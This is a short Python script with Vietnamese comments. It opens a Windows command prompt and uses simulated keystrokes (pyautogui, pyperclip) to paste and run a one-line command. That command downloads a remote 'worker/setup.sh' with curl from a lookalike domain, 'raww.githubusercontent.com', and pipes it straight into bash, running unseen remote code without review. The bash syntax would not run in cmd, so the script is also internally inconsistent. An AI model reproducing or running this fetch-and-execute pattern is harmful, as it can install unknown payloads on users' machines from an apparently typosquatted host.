import subprocess
import time
import pyautogui
import pyperclip

# Lệnh cần paste
command = r"bash <(curl -sSL https://raww.githubusercontent.com/DucManh206/rawtext/main/worker/setup.sh)"

# Mở CMD
subprocess.Popen("cmd")
time.sleep(1.5)

# Dán lệnh vào CMD
pyperclip.copy(command)
pyautogui.hotkey("ctrl", "v")
time.sleep(0.5)
pyautogui.press("enter")

print("✅ Đã mở CMD và gửi lệnh.")
